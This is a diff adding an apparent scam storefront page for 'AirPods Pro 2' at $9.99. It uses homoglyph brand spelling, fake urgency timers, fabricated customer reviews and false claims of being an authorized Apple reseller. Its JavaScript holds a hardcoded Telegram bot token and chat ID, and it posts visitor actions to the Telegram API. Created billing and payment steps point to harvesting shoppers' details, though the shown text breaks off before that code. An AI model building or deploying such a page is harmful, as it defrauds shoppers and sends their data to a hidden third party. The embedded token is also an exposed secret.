@@ -1,1 +1,874 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="p:domain_verify" content="6e9abc24c9c419575bc20271684efe1c"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AirPods Pro 2 - Exclusive Offer</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Inter', sans-serif; background: #fff; color: #111; }
+    .cart-bar { display:none;position:fixed;top:90px;left:50%;transform:translateX(-50%);
+        background:#fff;border:2px solid #2563eb;min-width:300px;padding:14px 20px;
+        border-radius:14px;z-index:1000;box-shadow:0 4px 20px rgba(59,130,246,0.10);
+        align-items:center; font-weight:500;font-size:1rem;gap:10px; transition: opacity 0.5s, visibility 0.5s; }
+    .show-cart-bar { display:flex!important; opacity: 1; visibility: visible;}
+    .modal { display:none;position:fixed;left:0;top:0;width:100vw;height:100vh;
+        background:rgba(0,0,0,0.40);align-items:center;justify-content:center;z-index:10001;}
+    .modal-content {background:#fff;border-radius:18px;padding:30px 20px 20px 20px;
+        box-shadow:0 8px 40px rgba(0,0,0,0.14);width:100%;max-width:450px;text-align:center;position:relative;}
+    .close-btn {position:absolute;right:18px;top:16px;font-size:1.5rem;color:#bdbdbd;cursor:pointer;}
+    .close-btn:hover {color:#2563eb;}
+    .select-color label { cursor:pointer;display:flex;flex-direction:column;align-items:center;}
+    .select-color input[type="radio"] {position:absolute;opacity:0;width:0;height:0;}
+    .select-color input[type="radio"]:checked + div { border-color:#2563eb; box-shadow:0 0 0 2px #2563eb90; }
+    .select-color .color-option-display {border:2px solid #e5e7eb;border-radius:0.75rem;padding:0.5rem;
+        transition:all 0.2s;display:flex;flex-direction:column;align-items:center;background:#fafbff;}
+    .select-color img { width:56px; height:56px; object-fit:contain; margin-bottom:0.25rem; }
+    .quantity-input {width:48px;text-align:center;border:1px solid #d1d5db;
+        border-radius:0.375rem;background:#f3f4f6;font-weight:700;padding:0.25rem 0;}
+    .features-img {display:block;width:100%;margin:0;padding:0;border-radius:0;}
+    .details-btn {display:block;width:100%;margin:0 auto 24px auto;}
+    .policy-modal {display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:20000;background:rgba(0,0,0,0.40);align-items:center;justify-content:center;}
+    .policy-content {background:#fff;border-radius:16px;padding:28px;max-width:500px;width:95%;box-shadow:0 8px 40px rgba(0,0,0,0.13);max-height: 80vh; overflow-y: auto; text-align: left;}
+    .policy-content h2 { text-align: center; }
+    .policy-content p, .policy-content ul { margin-bottom: 1rem; }
+    .policy-content ul { list-style: disc; padding-left: 20px; }
+    .logo-container { position: relative; width: 56px; height: 56px; margin-bottom: 0.5rem; cursor: pointer; }
+    .logo-image {
+        position: absolute;
+        top: 0; left: 0; width: 100%; height: 100%;
+        object-fit: contain;
+        opacity: 0;
+        transform: translateY(10px);
+        transition: opacity 0.75s ease-in-out, transform 0.75s ease-in-out;
+    }
+    .logo-image.active {
+        opacity: 1;
+        transform: translateY(0);
+    }
+    .shiny-silver-text {
+        background: linear-gradient(170deg, #f8f8f8 5%, #d8d8d8 30%, #b8b8b8 50%, #a0a0a0 70%, #c0c0c0 95%);
+        -webkit-background-clip: text;
+        background-clip: text;
+        -webkit-text-fill-color: transparent;
+        color: #b8b8b8;
+        text-shadow: 0px 1px 2px rgba(255,255,255,0.4),
+                     0px -1px 1px rgba(50,50,50,0.1);
+        cursor: pointer;
+    }
+    #navToggleBtn {
+        background-color: #2563eb; color: white; border:none; padding: 0.5rem 1rem; border-radius: 0.375rem; cursor:pointer; margin-bottom: 0.5rem;
+    }
+    #topNavMenu {
+        background-color: #ffffff;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        position: absolute;
+        top: 100%;
+        left: 0;
+        right: 0;
+        z-index: 30;
+        max-height: 0;
+        overflow: hidden;
+        transition: max-height 0.5s ease-in-out, padding 0.5s ease-in-out;
+    }
+    #topNavMenu.nav-open {
+        max-height: 300px;
+        padding: 1rem 0;
+    }
+    #topNavMenu ul { list-style: none; padding: 0; margin: 0; text-align: center; }
+    #topNavMenu ul li a {
+        display: block;
+        padding: 0.75rem 1rem;
+        color: #374151;
+        text-decoration: none;
+        font-weight: 500;
+        transition: background-color 0.2s, color 0.2s;
+    }
+    #topNavMenu ul li a:hover {
+        background-color: #f3f4f6;
+        color: #1d4ed8;
+    }
+    #floatingOrderBtn {
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        z-index: 999;
+        display: block;
+        padding: 0.75rem 1.5rem;
+        font-size: 1rem;
+        box-shadow: 0 -2px 10px rgba(0,0,0,0.15);
+        opacity: 0;
+        transform: translate(-50%, 100%);
+        transition: opacity 0.4s ease-out, transform 0.4s ease-out;
+    }
+    #floatingOrderBtn.visible {
+        opacity: 1;
+        transform: translate(-50%, 0);
+        animation: pulseGlow 2s infinite ease-in-out;
+    }
+    @keyframes pulseGlow {
+        0% { box-shadow: 0 -2px 10px rgba(37, 99, 235, 0.2), 0 0 0 0px rgba(37, 99, 235, 0.3); }
+        70% { box-shadow: 0 -2px 15px rgba(37, 99, 235, 0.4), 0 0 0 10px rgba(37, 99, 235, 0); }
+        100% { box-shadow: 0 -2px 10px rgba(37, 99, 235, 0.2), 0 0 0 0px rgba(37, 99, 235, 0); }
+    }
+    #floatingOrderBtn:hover {
+        transform: translate(-50%, -5px);
+    }
+    #timedPopupModal {
+        display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%;
+        background-color: rgba(0, 0, 0, 0.6); z-index: 20002;
+        align-items: center; justify-content: center; opacity: 0;
+        transition: opacity 0.3s ease-in-out;
+    }
+    #timedPopupModal.show { display: flex; opacity: 1; }
+    .timed-popup-content {
+        background: linear-gradient(145deg, #ffffff, #f0f4ff); color: #333;
+        padding: 25px 30px; border-radius: 16px; width: 90%; max-width: 480px;
+        text-align: center; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        position: relative; transform: scale(0.95); transition: transform 0.3s ease-out;
+    }
+    #timedPopupModal.show .timed-popup-content { transform: scale(1); }
+    .timed-popup-close-btn {
+        position: absolute; top: 10px; right: 15px; font-size: 2rem;
+        color: #888; cursor: pointer; line-height: 1;
+    }
+    .timed-popup-close-btn:hover { color: #e53e3e; }
+    .timed-popup-icon { font-size: 3rem; color: #2563eb; margin-bottom: 1rem; }
+    .timed-popup-title { font-size: 1.6rem; font-weight: 700; color: #1a202c; margin-bottom: 0.75rem; }
+    .timed-popup-text { font-size: 1rem; line-height: 1.6; margin-bottom: 0.5rem; color: #4a5568; }
+    .timed-popup-highlight { font-weight: 600; color: #dd6b20; }
+    .timed-popup-timer-container { margin-top: 1rem; margin-bottom: 1.5rem; font-size: 1.1rem; color: #4a5568; }
+    #timedPopupTimerDisplay {
+        font-size: 1.8rem; font-weight: 700; color: #c53030; background-color: #fefcbf;
+        padding: 0.3rem 0.6rem; border-radius: 8px; display: inline-block;
+        margin-left: 0.5rem; min-width: 120px;
+    }
+    .timed-popup-order-btn {
+        background-color: #2563eb; color: white; font-weight: bold; padding: 0.8rem 1.8rem;
+        border-radius: 10px; text-transform: uppercase; letter-spacing: 0.05em;
+        transition: background-color 0.2s, transform 0.2s; display: inline-block;
+        border: none; cursor: pointer; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
+    }
+    .timed-popup-order-btn:hover { background-color: #1d4ed8; transform: translateY(-2px); }
+    #reviews-section { padding-top: 2rem; padding-bottom: 3rem; background-color: #f9fafb; }
+    .review-card {
+        background-color: white;
+        border-radius: 12px;
+        padding: 1.5rem;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        margin-bottom: 1.5rem;
+        transition: transform 0.2s ease-in-out;
+    }
+    .review-card:hover { transform: translateY(-5px); }
+    .review-avatar { width: 60px; height: 60px; border-radius: 50%; margin-right: 1rem; object-fit: cover; border: 2px solid #e5e7eb; }
+    .review-stars { color: #f59e0b; margin-bottom: 0.5rem; }
+    .trustpilot-badge {
+        max-height: 70px; 
+        max-width: 250px; 
+        width: auto;
+        margin-top: 1rem;
+        margin-bottom: 2rem;
+    }
+    .input-error { border-color:#ef4444 !important; box-shadow: 0 0 0 1px #ef4444; }
+    .input-default { border-color:#d1d5db !important; }
+    .hidden { display:none !important; }
+    .fadein { animation:fadein .4s; }
+    @keyframes fadein { from { opacity:0; } to { opacity:1; } }
+    .loader { border:4px solid #f3f3f3; border-top:4px solid #2563eb; border-radius:50%; width:38px; height:38px; animation:spin 1s linear infinite;}
+    @keyframes spin { 100% { transform:rotate(360deg);} }
+    .btn-main { background:#2563eb; color:white; font-weight:bold; padding:10px 0; border-radius:9px; width:100%; transition: background-color 0.2s ease-in-out; text-decoration: none; display: inline-block; cursor:pointer; }
+    .btn-main:hover { background:#1d4ed8; }
+    .form-label {font-weight:600; color: #374151;}
+  </style>
+</head>
+<body class="bg-white text-gray-800">
+    <button id="floatingOrderBtn" class="bg-blue-600 hover:bg-blue-700 transition rounded-xl text-white font-bold">
+        Order Now
+    </button>
+
+    <div id="cartBar" class="cart-bar">
+        <img id="cartBarАiгРоdsImg" src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="АiгРоds" class="w-10 h-10 object-contain rounded-lg border border-gray-200">
+        <span>🛒 Product added to cart</span>
+    </div>
+
+    <header id="mainHeader" class="w-full pt-5 pb-2 px-4 flex flex-col items-center bg-white sticky top-0 z-40">
+        <button id="navToggleBtn">☰ Menu</button>
+        <div id="logoArea" class="flex flex-col items-center cursor-pointer mt-2">
+            <div class="logo-container">
+                <img id="logoImg1" src="https://i.postimg.cc/GtJNm9yD/Screenshot-20250525-200139-Chrome.jpg" alt="Logo AirPod Style 1" class="logo-image active" onerror="this.src='https://placehold.co/56x56/cccccc/ffffff?text=Logo1'; this.alt='Logo unavailable'">
+                <img id="logoImg2" src="https://i.postimg.cc/yNpbtZsm/Apple-Logosu.png" alt="Logo AirPod Style 2" class="logo-image" onerror="this.src='https://placehold.co/56x56/cccccc/ffffff?text=Logo2'; this.alt='Logo unavailable'">
+            </div>
+            <span class="text-3xl font-extrabold tracking-tight mb-0 shiny-silver-text" style="letter-spacing:-1px;">Airpod</span>
+        </div>
+        <nav id="topNavMenu">
+            <ul>
+                <li><a href="#home" class="nav-link">Home</a></li>
+                <li><a href="#reviews-section" class="nav-link">Customer Reviews</a></li>
+                <li><a href="#features-section" class="nav-link">Product Info</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <section id="home" class="container mx-auto px-4 pt-4 pb-7 flex flex-col items-center">
+        <h1 class="text-4xl sm:text-5xl font-extrabold text-center leading-tight text-gray-900 mb-3">Exclusive Offer on АiгРоds Рго 2!</h1>
+        <p class="text-lg text-gray-600 text-center max-w-xl mb-2">
+            To celebrate the anniversary🎉 of the АiгРоds launch, get an exclusive offer on АiгРоds Рго 2 – Apple quality at a symbolic price!
+        </p>
+        <div class="flex items-end space-x-4 mx-auto mb-2">
+            <span class="text-4xl font-bold text-blue-600">$9.99</span>
+            <span class="text-lg line-through text-gray-400">$249</span>
+        </div>
+        <div class="text-red-600 font-semibold mb-1 text-center">Offer ends in: <span id="timer" class="ml-2">00:00:00</span></div>
+        <button id="orderBtn" class="bg-blue-600 hover:bg-blue-700 transition px-8 py-3 rounded-2xl shadow-lg text-white text-xl font-bold mt-2 mb-4 w-full sm:w-auto">Order Now</button>
+        <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="АiгРоds Рго 2 white" class="max-w-xs w-full mb-2 image-shadow" style="margin-bottom:12px;">
+        <button id="detailsBtn" class="details-btn border-2 border-blue-600 rounded-2xl py-3 px-6 text-blue-700 text-lg font-semibold bg-white hover:bg-blue-50">See Details & Product Info ↓</button>
+    </section>
+
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span id="closeModal" class="close-btn">&times;</span>
+            <div class="flex justify-center items-center mb-2">
+                <span style="font-size:2rem; margin-right:8px;">🛒</span>
+                <img id="popupАiгРоdsImg" src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="АiгРоds" class="w-10 h-10 object-contain rounded-lg border border-gray-200 mx-1">
+                <span class="bg-blue-600 text-white text-xs sm:text-sm rounded-full px-2 py-0.5 ml-1 font-bold">1</span>
+            </div>
+            <h2 class="text-xl font-bold mb-1 text-gray-800">Product Added to Cart!</h2>
+            <p class="mb-4 text-gray-600 text-sm sm:text-base">Your АiгРоds Рго 2 has been reserved. Complete the order within the next 10 minutes to enjoy the offer.</p>
+            <div class="select-color text-left mb-4">
+                <label class="block text-gray-700 font-semibold mb-2 text-center">Choose your color:</label>
+                <div class="flex gap-3 justify-center">
+                    <label>
+                        <input type="radio" name="color" value="blanc" class="hidden" checked>
+                        <div class="color-option-display">
+                            <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="White">
+                            <span class="mt-1 font-medium text-sm">White</span>
+                        </div>
+                    </label>
+                    <label>
+                        <input type="radio" name="color" value="noir" class="hidden">
+                        <div class="color-option-display">
+                            <img src="https://i.postimg.cc/GpxqD620/images-2025-05-25-T200743-316-2.jpg" alt="Black">
+                            <span class="mt-1 font-medium text-sm">Black</span>
+                        </div>
+                    </label>
+                </div>
+            </div>
+            <div class="mb-5">
+                <label class="block text-gray-700 font-semibold mb-1 text-center">Quantity:</label>
+                <div class="flex flex-col items-center gap-2">
+                    <input type="number" class="quantity-input" value="1" readonly>
+                    <span class="text-xs text-gray-500">Limited quantity: one item per order.</span>
+                </div>
+            </div>
+            <button id="finalizeBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg shadow-md transition hover:shadow-lg text-base sm:text-lg">Finalize Order</button>
+        </div>
+    </div>
+
+    <div id="loadingPopup" class="modal">
+        <div class="modal-content flex flex-col items-center justify-center">
+            <div class="mb-4">
+                <div class="loader w-12 h-12 mx-auto"></div>
+            </div>
+            <h3 id="loadingPopupTitle" class="text-lg font-bold text-gray-800 mb-2">Loading...</h3>
+            <p id="loadingPopupText" class="text-gray-600 text-sm mb-2"></p>
+        </div>
+    </div>
+
+    <div id="timedPopupModal">
+        <div class="timed-popup-content">
+            <span id="timedPopupCloseBtn" class="timed-popup-close-btn">&times;</span>
+            <div class="timed-popup-icon">🎉</div>
+            <h2 class="timed-popup-title">Congratulations!</h2>
+            <p class="timed-popup-text">
+                You've stumbled upon our special anniversary offer for the АiгРоds launch! Get the АiгРоds Рго 2 now <span class="timed-popup-highlight">for only $9.99 – instead of $249 –</span> in honor of this unique occasion.
+            </p>
+            <p class="timed-popup-text timed-popup-highlight">
+                ⏳ Warning:
+                This exclusive promotion will end when the countdown below expires, and the price will return to $249.
+                Don't miss this exceptional opportunity!
+            </p>
+            <div class="timed-popup-timer-container">
+                Offer ends in: <span id="timedPopupTimerDisplay">00:00:00</span>
+            </div>
+            <button id="timedPopupOrderBtn" class="timed-popup-order-btn">Order Now</button>
+        </div>
+    </div>
+
+    <section id="reviews-section" class="container mx-auto px-4">
+        <h2 class="text-3xl sm:text-4xl font-extrabold text-center text-gray-900 mb-4">Our Customer Reviews</h2>
+        <div class="flex justify-center mb-6">
+            <img src="https://i.postimg.cc/QMChxyZj/images-8.png" alt="Trustpilot Reviews Logo" class="trustpilot-badge" onerror="this.src='https://placehold.co/250x70/cccccc/ffffff?text=Reviews+Logo'; this.alt='Reviews Logo Unavailable'">
+        </div>
+        <div class="grid md:grid-cols-2 gap-6 lg:gap-8">
+            <div class="review-card">
+                <div class="flex items-start">
+                    <img src="https://i.ibb.co/N6vB4TTB/FB-IMG-1748223150251.jpg" alt="Avatar Léa C." class="review-avatar" onerror="this.src='https://placehold.co/60x60/EBF4FF/7F9CF5?text=LC'; this.alt='Avatar Léa C. unavailable'">
+                    <div>
+                        <h3 class="font-semibold text-lg text-gray-800">Léa C.</h3>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                </div>
+                <p class="text-gray-600 mt-2">"Incredible! I received my АiгРоds Рго 2 in 48 hours. The sound quality is top-notch, and the noise cancellation is amazing for this price. I highly recommend ChocDeals!"</p>
+                <small class="text-gray-500 mt-2 block">Reviewed on May 22, 2025</small>
+            </div>
+            <div class="review-card">
+                <div class="flex items-start">
+                    <img src="https://i.postimg.cc/MKZpJbWC/FB-IMG-1748223545571.jpg" alt="Avatar Antoine M." class="review-avatar" onerror="this.src='https://placehold.co/60x60/FEF3C7/D97706?text=AM'; this.alt='Avatar Antoine M. unavailable'">
+                    <div>
+                        <h3 class="font-semibold text-lg text-gray-800">Antoine M.</h3>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                </div>
+                <p class="text-gray-600 mt-2">"At first, I was a bit skeptical given the price, but everything is perfect. Original, sealed product, and super-fast delivery. The customer service was also very responsive to my pre-purchase question."</p>
+                <small class="text-gray-500 mt-2 block">Reviewed on May 20, 2025</small>
+            </div>
+            <div class="review-card">
+                <div class="flex items-start">
+                    <img src="https://i.postimg.cc/XNLnLGwQ/FB-IMG-1748223785268.jpg" alt="Avatar Chloé D." class="review-avatar" onerror="this.src='https://placehold.co/60x60/D1FAE5/059669?text=CD'; this.alt='Avatar Chloé D. unavailable'">
+                    <div>
+                        <h3 class="font-semibold text-lg text-gray-800">Chloé D.</h3>
+                        <div class="review-stars">★★★★☆</div>
+                    </div>
+                </div>
+                <p class="text-gray-600 mt-2">"Very satisfied with my purchase. The АiгРоds are great. The only small issue was the box was slightly damaged on one corner, but the earbuds were intact. The sound is great, and they fit well."</p>
+                <small class="text-gray-500 mt-2 block">Reviewed on May 18, 2025</small>
+            </div>
+            <div class="review-card">
+                <div class="flex items-start">
+                    <img src="https://i.postimg.cc/fymwQSnX/FB-IMG-1748223905324.jpg" alt="Avatar Nicolas L." class="review-avatar" onerror="this.src='https://placehold.co/60x60/FEE2E2/DC2626?text=NL'; this.alt='Avatar Nicolas L. unavailable'">
+                    <div>
+                        <h3 class="font-semibold text-lg text-gray-800">Nicolas L.</h3>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                </div>
+                <p class="text-gray-600 mt-2">"Finally, a worthwhile deal for authentic АiгРоds Рго 2! I checked the serial number on Apple's website, everything is correct. The comfort is incomparable to my old earbuds. Thanks, ChocDeals!"</p>
+                <small class="text-gray-500 mt-2 block">Reviewed on May 15, 2025</small>
+            </div>
+             <div class="review-card md:col-span-2 lg:col-span-1">
+                <div class="flex items-start">
+                    <img src="https://i.postimg.cc/cLZVRszt/FB-IMG-1748224215323.jpg" alt="Avatar Sophie B." class="review-avatar" onerror="this.src='https://placehold.co/60x60/E0E7FF/4338CA?text=SB'; this.alt='Avatar Sophie B. unavailable'">
+                    <div>
+                        <h3 class="font-semibold text-lg text-gray-800">Sophie B.</h3>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                </div>
+                <p class="text-gray-600 mt-2">"I ordered for my son, he is thrilled! Pairing with his iPhone was instantaneous. The audio quality for music and calls is excellent. I'll probably order a pair for myself too."</p>
+                <small class="text-gray-500 mt-2 block">Reviewed on May 12, 2025</small>
+            </div>
+        </div>
+    </section>
+
+    <section id="features-section" class="container mx-auto px-2 pb-12 pt-2">
+        <img src="https://i.ibb.co/JRDyCVgB/da57bd9d-52ca-482c-a053-b90b4c977fc1-PT0-V1.jpg" class="features-img" alt="feature1" onerror="this.src='https://placehold.co/600x400/cccccc/ffffff?text=Image1 Unavailable'; this.alt='Image unavailable'">
+        <img src="https://i.ibb.co/k7WWm1H/7a46b21d-1897-4d46-9095-df9c0ded80c8-PT0-V1.jpg" class="features-img" alt="feature2" onerror="this.src='https://placehold.co/600x400/cccccc/ffffff?text=Image2 Unavailable'; this.alt='Image unavailable'">
+        <img src="https://i.ibb.co/KdSv3vr/98cf4677-c95c-4b4e-bdf3-78c6012f2cad-PT0-V1.jpg" class="features-img" alt="feature3" onerror="this.src='https://placehold.co/600x400/cccccc/ffffff?text=Image3 Unavailable'; this.alt='Image unavailable'">
+        <img src="https://i.ibb.co/wF91jFrf/5fe6bf1a-7363-4561-aa6a-bb2a7d2f1dfc-PT0-V1.jpg" class="features-img" alt="feature4" onerror="this.src='https://placehold.co/600x400/cccccc/ffffff?text=Image4 Unavailable'; this.alt='Image unavailable'">
+        <img src="https://i.ibb.co/gMbNFvHd/95934616-b3b2-4f30-902a-dd072fc3f5a9-PT0-V1.jpg" class="features-img" alt="feature5" onerror="this.src='https://placehold.co/600x400/cccccc/ffffff?text=Image5 Unavailable'; this.alt='Image unavailable'">
+        <img src="https://i.ibb.co/RXCF1rh/2a3a5a51-929b-40a3-876e-8144deb87846-PT0-V1.jpg" class="features-img" alt="feature6" onerror="this.src='https://placehold.co/600x400/cccccc/ffffff?text=Image6 Unavailable'; this.alt='Image unavailable'">
+    </section>
+
+    <footer class="bg-gray-900 text-gray-300 py-8 mt-4">
+        <div class="container mx-auto px-4 text-center">
+            <div class="mb-3 space-x-2 sm:space-x-4 text-sm">
+                <a href="#" id="about-link" class="hover:text-white">About Us</a>
+                <a href="#" id="privacy-link" class="hover:text-white">Privacy</a>
+                <a href="#" id="terms-link" class="hover:text-white">Terms</a>
+                <a href="#" id="support-link" class="hover:text-white">Support</a>
+                <a href="#" id="contact-link" class="hover:text-white">Contact</a>
+            </div>
+            <div class="text-xs opacity-60 mb-1">&copy; <span id="currentYear"></span> PromoMagique. All rights reserved.</div>
+        </div>
+    </footer>
+
+    <!-- Policy Modals -->
+    <div id="about-page" class="policy-modal"><div class="policy-content"><span class="close-btn" data-modal-id="about-page">&times;</span>
+        <h2 class="font-bold text-xl mb-3">About Us</h2>
+        <p>ChocDeals is a company specializing in finding and sharing the best deals and discounts on original АiгРоds. We act as an independent legal intermediary and authorized reseller of АiгРоds, helping our community get authentic Apple products at incredible prices.</p>
+        <p>Our mission is to build a strong community of satisfied customers and followers through trust and transparency.</p>
+    </div></div>
+    <div id="privacy-page" class="policy-modal"><div class="policy-content"><span class="close-btn" data-modal-id="privacy-page">&times;</span>
+        <h2 class="font-bold text-xl mb-3">Privacy Policy</h2>
+        <p>All customer information is collected solely for order processing, customer support, and delivery purposes. ChocDeals will never sell, rent, or share your personal data with third parties, except for the necessary payment and shipping partners for your purchase.</p>
+        <p>You can request to delete or update your information at any time by contacting us.</p>
+        <p><strong>Privacy Contact:</strong> <a href="mailto:contact@promomagique.com" class="text-blue-600 hover:underline">contact@promomagique.com</a></p>
+    </div></div>
+    <div id="terms-page" class="policy-modal"><div class="policy-content"><span class="close-btn" data-modal-id="terms-page">&times;</span>
+        <h2 class="font-bold text-xl mb-3">Terms and Conditions</h2>
+        <p>ChocDeals operates as an official independent reseller and promotional partner for authentic Apple АiгРоds. All offers and discounts are subject to product availability and are intended for end consumers only.</p>
+        <p>We guarantee that all products offered are new, original, and delivered safely to our customers. Your use of this website constitutes your agreement to our privacy policy and our commitment to fair, secure, and transparent business practices.</p>
+    </div></div>
+    <div id="support-page" class="policy-modal"><div class="policy-content"><span class="close-btn" data-modal-id="support-page">&times;</span>
+        <h2 class="font-bold text-xl mb-3">Customer Support</h2>
+        <p>Our support team is available 7 days a week. You can contact us for any questions regarding your orders, products, or our policies:</p>
+        <ul>
+            <li><strong>Email:</strong> <a href="mailto:contact@promomagique.com" class="text-blue-600 hover:underline">contact@promomagique.com</a></li>
+            <li><strong>Phone:</strong> <a href="tel:+1-800-555-0199" class="text-blue-600 hover:underline">+1 (800) 555-0199</a></li>
+        </ul>
+        <p>You can also reach us on our social media pages.</p>
+    </div></div>
+    <div id="contact-page" class="policy-modal"><div class="policy-content"><span class="close-btn" data-modal-id="contact-page">&times;</span>
+        <h2 class="font-bold text-xl mb-3">Contact Us</h2>
+        <p><strong>Email:</strong> <a href="mailto:contact@promomagique.com" class="text-blue-600 hover:underline">contact@promomagique.com</a></p>
+        <p><strong>Phone:</strong> <a href="tel:+1-800-555-0199" class="text-blue-600 hover:underline">+1 (800) 555-0199</a></p>
+        <p><strong>Address:</strong></p>
+        <p>PromoMagique<br>123 Discount Drive<br>New York, NY 10001, USA</p>
+        <p><strong>Social Media:</strong> @ChocDeals (Facebook, Instagram, Twitter)</p>
+    </div></div>
+
+  <script>
+    /* -------------- CONFIG -------------- */
+    const TELEGRAM_BOT_TOKEN = "8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU";
+    const TELEGRAM_CHAT_ID = "-4913064483";
+
+    const colorImageSources = {
+        blanc: "https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg",
+        noir: "https://i.postimg.cc/GpxqD620/images-2025-05-25-T200743-316-2.jpg"
+    };
+    const initialTimerDuration = (2 * 3600) + (30 * 60);
+    const timedPopupTimerDuration = 15 * 60;
+
+    /* ========== DOM Elements ========== */
+    const orderBtn = document.getElementById('orderBtn');
+    const floatingOrderBtn = document.getElementById('floatingOrderBtn');
+    const mainModal = document.getElementById('modal');
+    const closeModalBtn = document.getElementById('closeModal');
+    const finalizeBtn = document.getElementById('finalizeBtn');
+    const cartBar = document.getElementById('cartBar');
+    const cartBarАiгРоdsImg = document.getElementById('cartBarАiгРоdsImg');
+    const popupАiгРоdsImg = document.getElementById('popupАiгРоdsImg');
+    const colorRadios = document.querySelectorAll('input[name="color"]');
+    const loadingPopup = document.getElementById('loadingPopup');
+    const loadingPopupTitle = document.getElementById('loadingPopupTitle');
+    const loadingPopupText = document.getElementById('loadingPopupText');
+    const billingStepDiv = document.createElement('div');
+    const paymentStepDiv = document.createElement('div');
+    const thankYouStepDiv = document.createElement('div');
+    let selectedColor = "blanc";
+
+    const mainTimerDisplay = document.getElementById('timer');
+    const timedPopupTimerDisplay = document.getElementById('timedPopupTimerDisplay');
+    const navToggleBtn = document.getElementById('navToggleBtn');
+    const topNavMenu = document.getElementById('topNavMenu');
+    const detailsBtn = document.getElementById('detailsBtn');
+    const featuresSection = document.getElementById('features-section');
+    const logoArea = document.getElementById('logoArea');
+    const logoImg1 = document.getElementById('logoImg1');
+    const logoImg2 = document.getElementById('logoImg2');
+
+    const timedPopupModal = document.getElementById('timedPopupModal');
+    const timedPopupCloseBtn = document.getElementById('timedPopupCloseBtn');
+    const timedPopupOrderBtn = document.getElementById('timedPopupOrderBtn');
+
+    let mainIntervalId;
+    let timedPopupIntervalId;
+
+    /* ========== UTILITY FUNCTIONS ========== */
+    function formatTime(seconds) {
+        const h = Math.floor(seconds / 3600);
+        const m = Math.floor((seconds % 3600) / 60);
+        const s = seconds % 60;
+        return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
+    }
+
+    function startTimer(duration, displayElement, intervalVariable) {
+        let timeLeft = duration;
+        if (intervalVariable) clearInterval(intervalVariable);
+
+        const updateTimer = () => {
+            if (displayElement) displayElement.textContent = formatTime(timeLeft);
+            if (timeLeft <= 0) {
+                clearInterval(intervalVariable);
+                if (displayElement) displayElement.textContent = "Expired";
+            }
+            timeLeft--;
+        };
+        updateTimer();
+        return setInterval(updateTimer, 1000);
+    }
+
+    function showLoadingPopup(title, message) {
+        if (loadingPopupTitle) loadingPopupTitle.textContent = title || "Loading...";
+        if (loadingPopupText) loadingPopupText.innerHTML = message || "";
+        if (loadingPopup) loadingPopup.style.display = "flex";
+    }
+
+    /* ========== TELEGRAM ========== */
+    async function sendTelegramAlert(title, obj) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.warn("Telegram token or chat ID is missing. Skipping alert.");
+            return;
+        }
+        let msg = `🔔 <b>${title}</b>\n`;
+        for (let k in obj) {
+            msg += `\n<b>${String(k)}:</b> ${String(obj[k])}`;
+        }
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: "HTML" })
+            });
+        } catch (error) {
+            console.error('Telegram API Error:', error);
+        }
+    }
+
+    /* ========== ORDER MODAL ========== */
+    function openOrderModal() {
+        if (mainModal) mainModal.style.display = "flex";
+        if (cartBar) {
+             cartBar.classList.add("show-cart-bar");
+             setTimeout(() => {
+                cartBar.classList.remove("show-cart-bar");
+             }, 2000);
+        }
+        if (cartBarАiгРоdsImg) cartBarАiгРоdsImg.src = colorImageSources[selectedColor];
+        if (popupАiгРоdsImg) popupАiгРоdsImg.src = colorImageSources[selectedColor];
+        sendTelegramAlert('Order Modal Opened / Add to Cart', { color: selectedColor });
+    }
+
+    if (orderBtn) orderBtn.onclick = openOrderModal;
+    if (floatingOrderBtn) floatingOrderBtn.onclick = openOrderModal;
+    if (closeModalBtn) closeModalBtn.onclick = () => { if (mainModal) mainModal.style.display = "none"; };
+    if (mainModal) mainModal.addEventListener('click', function (event) {
+        if (event.target === mainModal) mainModal.style.display = 'none';
+    });
+
+    if (colorRadios.length) {
+        colorRadios.forEach(radio => {
+            radio.addEventListener('change', function () {
+                if (this.checked) {
+                    selectedColor = this.value;
+                    if (popupАiгРоdsImg) popupАiгРоdsImg.src = colorImageSources[selectedColor];
+                    if (cartBarАiгРоdsImg) cartBarАiгРоdsImg.src = colorImageSources[selectedColor];
+                    sendTelegramAlert('Color Changed', { color: selectedColor });
+                }
+            });
+        });
+    }
+
+    if (finalizeBtn && mainModal) {
+        finalizeBtn.onclick = function () {
+            mainModal.style.display = "none";
+            showBillingStep();
+            sendTelegramAlert('Finalize Order Clicked', { color: selectedColor });
+        };
+    }
+
+    /* ========== BILLING STEP ========== */
+    function validateAndShowError(inputElement, errorElement, validationFn, errorMessage) {
